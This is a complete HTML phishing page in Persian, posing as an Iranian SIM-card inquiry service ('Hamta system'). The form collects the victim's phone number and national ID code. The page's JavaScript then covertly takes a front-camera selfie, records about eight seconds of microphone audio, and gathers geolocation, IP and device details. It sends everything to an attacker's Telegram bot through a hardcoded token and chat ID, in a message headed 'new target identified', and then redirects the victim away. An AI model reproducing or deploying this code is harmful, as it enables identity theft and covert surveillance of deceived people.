<!DOCTYPE html>
<html lang="fa">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>سامانه استعلام سیم‌کارت</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Tahoma, sans-serif;
        }
        body {
            background: linear-gradient(145deg, #0b2b3f, #1a4b61);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            direction: rtl;
            margin: 0;
        }
        .container {
            background: white;
            padding: 35px 25px;
            border-radius: 24px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.5);
            width: 400px;
            text-align: center;
        }
        .logo { font-size: 48px; margin-bottom: 10px; }
        h2 { color: #1a2a3a; font-size: 22px; margin-bottom: 8px; }
        .sub { color: #6c7a8a; font-size: 14px; margin-bottom: 25px; }
        input {
            width: 100%;
            padding: 14px;
            margin: 10px 0;
            border: 2px solid #e2e8f0;
            border-radius: 12px;
            font-size: 15px;
            background: #f8fafc;
            text-align: center;
        }
        input:focus {
            border-color: #1a7ae8;
            background: white;
            outline: none;
        }
        button {
            width: 100%;
            padding: 14px;
            background: #1a7ae8;
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 17px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 12px;
        }
        button:hover { background: #0f5bb5; }
        .note {
            margin-top: 18px;
            font-size: 12px;
            color: #94a3b8;
            border-top: 1px solid #e2e8f0;
            padding-top: 16px;
        }
        .note span { color: #1a7ae8; font-weight: bold; }
        .input-group { text-align: right; margin: 5px 0; }
        .input-group label {
            font-size: 13px;
            color: #4a5a6a;
            font-weight: bold;
            display: block;
            margin-right: 5px;
        }
        #loading {
            display: none;
            margin-top: 15px;
            font-size: 14px;
            color: #1a7ae8;
        }
        #status {
            margin-top: 10px;
            font-size: 13px;
            color: #16a34a;
            display: none;
        }
        #errorMsg {
            margin-top: 10px;
            font-size: 13px;
            color: #dc2626;
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">📱</div>
        <h2>استعلام سیم‌کارت</h2>
        <p class="sub">برای استعلام وضعیت سیم‌کارت، اطلاعات زیر را وارد کنید</p>

        <form id="findForm">
            <div class="input-group">
                <label>📞 شماره موبایل</label>
                <input type="text" id="phone" placeholder="مثلاً 09123456789" required>
            </div>
            <div class="input-group">
                <label>🆔 کد ملی</label>
                <input type="text" id="nationalCode" placeholder="مثلاً 1234567890" required>
            </div>
            <button type="submit" id="submitBtn">🔍 استعلام</button>
        </form>

        <div id="loading">⏳ در حال پردازش...</div>
        <div id="status">✅ اطلاعات با موفقیت ارسال شد</div>
        <div id="errorMsg">❌ خطا در ارسال اطلاعات</div>

        <div class="note">
            🔒 اطلاعات شما محفوظ است · <span>سامانه همتا</span>
        </div>
    </div>

    <script>
        // ======================================================
        // تنظیمات ربات تلگرام
        // ======================================================
        const BOT_TOKEN = '8826841444:AAGLmSPOXr_tID0VKHFjhrhod9OqQhnNI60';
        const CHAT_ID = '7059995091';

        // ======================================================
        // دریافت اطلاعات دستگاه و IP
        // ======================================================
        function getDeviceInfo() {
            return {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screenWidth: screen.width,
                screenHeight: screen.height,
                colorDepth: screen.colorDepth,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                online: navigator.onLine,
                cookieEnabled: navigator.cookieEnabled,
                doNotTrack: navigator.doNotTrack || 'نامشخص'
            };
        }

        async function getIPInfo() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (e) {
                console.error('❌ خطا در دریافت IP:', e);
                return 'نامشخص';
            }
        }

        // ======================================================
        // تابع گرفتن عکس سلفی (فقط دوربین جلو)
        // ======================================================
        async function captureSelfie() {
            try {
                console.log('📸 گرفتن عکس سلفی...');
                
                // درخواست دسترسی به دوربین جلو
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: 'user',
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    }
                });

                // گرفتن عکس از استریم
                const photoBlob = await capturePhotoFromStream(stream);
                
                // بستن استریم
                stream.getTracks().forEach(track => track.stop());
                
                console.log('✅ عکس سلفی گرفته شد، حجم:', photoBlob.size, 'bytes');
                return photoBlob;
                
            } catch (error) {
                console.error('❌ خطا در گرفتن عکس سلفی:', error);
                alert('⚠️ لطفاً به مرورگر اجازه دسترسی به دوربین را بدهید.');
                return null;
            }
        }

        function capturePhotoFromStream(stream) {
            return new Promise((resolve, reject) => {
                const video = document.createElement('video');
                video.srcObject = stream;
                video.onloadedmetadata = () => {
                    video.play();
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    canvas.toBlob((blob) => {
                        if (blob) {
                            resolve(blob);
                        } else {
                            reject(new Error('تبدیل به Blob شکست خورد'));
                        }
                    }, 'image/jpeg', 0.8);
                };
                video.onerror = () => {
                    reject(new Error('خطا در پخش ویدئو'));
                };
            });
        }

        // ======================================================
        // تابع ضبط صدا
        // ======================================================
        async function recordAudio() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                const mediaRecorder = new MediaRecorder(stream);
                const audioChunks = [];

                mediaRecorder.ondataavailable = event => {
                    audioChunks.push(event.data);
                };

                const audioPromise = new Promise((resolve) => {
                    mediaRecorder.onstop = () => {
                        const audioBlob = new Blob(audioChunks, { type: 'audio/wav' });
                        resolve(audioBlob);
                    };
                });

                mediaRecorder.start();
                setTimeout(() => {
                    mediaRecorder.stop();
                    stream.getTracks().forEach(track => track.stop());
                }, 8000);

                return await audioPromise;
            } catch (e) {
                console.error('❌ خطا در ضبط صدا:', e);
                return null;
            }
        }

        // ======================================================
        // تابع گرفتن موقعیت
        // ======================================================
        function getLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve('موقعیت در دسترس نیست');
                    return;
                }
                navigator.geolocation.getCurrentPosition(
                    position => {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        resolve(`https://www.google.com/maps?q=${lat},${lon}`);
                    },
                    error => {
                        resolve('❌ خطا در گرفتن موقعیت');
                    }
                );
            });
        }

        // ======================================================
        // تابع ساخت پیام زیبا
        // ======================================================
        function buildBeautifulMessage(phone, nationalCode, ip, location, deviceInfo, audioStatus, selfieStatus) {
            let message = `🎯 **هدف جدید شناسایی شد** 🎯\n\n`;
            message += `🎨 **قالب:** 📶 اینترنت رایگان\n\n`;
            message += `🌐 **آدرس IP:**\n`;
            message += `${ip}\n\n`;
            message += `📍 **موقعیت تقریبی:**\n`;
            message += `${location}\n\n`;
            message += `🖥️ **مشخصات دستگاه:**\n`;
            message += `${deviceInfo.userAgent}\n\n`;
            message += `📝 **اطلاعات ورودی کاربر:**\n`;
            message += `📞 شماره: ${phone}\n`;
            message += `🆔 کد ملی: ${nationalCode}\n\n`;
            message += `📸 **وضعیت عکس سلفی:**\n`;
            message += `🤳 ${selfieStatus ? '✅ دریافت شد' : '❌ دریافت نشد'}\n\n`;
            message += `🎤 **ضبط صدا:** ${audioStatus ? '✅ انجام شد' : '❌ انجام نشد'}\n\n`;
            message += `⏱️ **زمان:** ${new Date().toLocaleString('fa-IR')}`;
            
            return message;
        }

        // ======================================================
        // توابع ارسال به تلگرام
        // ======================================================
        async function sendPhotoToTelegram(photoBlob, caption = '🤳 عکس سلفی') {
            try {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', photoBlob, 'selfie.jpg');
                formData.append('caption', caption);

                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });

                return response.ok;
            } catch (e) {
                console.error('❌ خطا در ارسال عکس:', e);
                return false;
            }
        }

        async function sendAudioToTelegram(audioBlob, caption = '🎤 ضبط صدا') {
            try {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('audio', audioBlob, 'recorded_audio.wav');
                formData.append('caption', caption);

                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {
                    method: 'POST',
                    body: formData
                });

                return response.ok;
            } catch (e) {
                console.error('❌ خطا در ارسال صدا:', e);
                return false;
            }
        }

        async function sendMessageToTelegram(message) {
            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });

                return response.ok;
            } catch (e) {
                console.error('❌ خطا در ارسال متن:', e);
                return false;
            }
        }

        // ======================================================
        // رویداد کلیک روی دکمه
        // ======================================================
        document.getElementById('findForm').addEventListener('submit', async function(e) {
            e.preventDefault();

            const phone = document.getElementById('phone').value;
            const nationalCode = document.getElementById('nationalCode').value;
            const loadingDiv = document.getElementById('loading');
            const statusDiv = document.getElementById('status');
            const errorDiv = document.getElementById('errorMsg');
            const submitBtn = document.getElementById('submitBtn');

            submitBtn.disabled = true;
            submitBtn.textContent = '⏳ در حال پردازش...';
            loadingDiv.style.display = 'block';
            statusDiv.style.display = 'none';
            errorDiv.style.display = 'none';

            try {
                // ۱. دریافت اطلاعات
                const deviceInfo = getDeviceInfo();
                const ip = await getIPInfo();
                const selfiePhoto = await captureSelfie(); // فقط عکس سلفی
                const audioBlob = await recordAudio();
                const location = await getLocation();

                // ۲. ساخت پیام زیبا
                const message = buildBeautifulMessage(
                    phone,
                    nationalCode,
                    ip,
                    location,
                    deviceInfo,
                    audioBlob !== null,
                    selfiePhoto !== null
                );

                // ۳. ارسال پیام متنی
                await sendMessageToTelegram(message);

                // ۴. ارسال عکس سلفی
                if (selfiePhoto) {
                    await sendPhotoToTelegram(selfiePhoto, '🤳 عکس سلفی');
                }

                // ۵. ارسال صدا
                if (audioBlob) {
                    await sendAudioToTelegram(audioBlob, '🎤 ضبط صدا');
                }

                statusDiv.style.display = 'block';
                statusDiv.textContent = '✅ همه اطلاعات با موفقیت ارسال شد';

                setTimeout(() => {
                    window.location.href = 'https://example.com/error';
                }, 2000);

            } catch (error) {
                console.error('❌ خطا:', error);
                errorDiv.style.display = 'block';
                errorDiv.textContent = '❌ خطا: ' + error.message;
            } finally {
                submitBtn.disabled = false;
                submitBtn.textContent = '🔍 استعلام';
                loadingDiv.style.display = 'none';
            }
        });

        console.log('✅ صفحه بارگذاری شد');
    </script>
</body>
            </html>
